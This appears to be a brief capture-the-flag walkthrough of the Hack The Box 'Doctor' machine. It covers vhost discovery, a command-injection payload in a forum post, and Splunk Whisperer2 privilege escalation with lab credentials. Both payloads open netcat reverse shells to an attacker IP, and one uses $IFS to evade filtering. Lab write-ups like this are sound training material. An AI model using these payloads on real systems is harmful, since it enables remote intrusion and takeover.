from the front page, we can see that there is a small but sure oddity - not doctor.htb but doctors.htb. 

modify etc/hosts to include 10.10.10.209 doctors.htb
then visit doctors.htb

during the login page, sql map did not work.
went to register and found a forum posting. 

from here, we can use a reverse shell, by opening netcat and forwarding from there: ""<img src=http://10.10.14.9/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.9'$IFS'1234')>""

found user.txt in /home/shaun/user.txt but its only readable by shaun

Splunk Whisperer2
--host 10.10.10.209 --lhost 10.10.14.9 --port 8089 -- lport --4455 --username Shaun --password Guitar123 --payload 'nc.traditional -e/bin/sh '10.10.14.9' '4455''
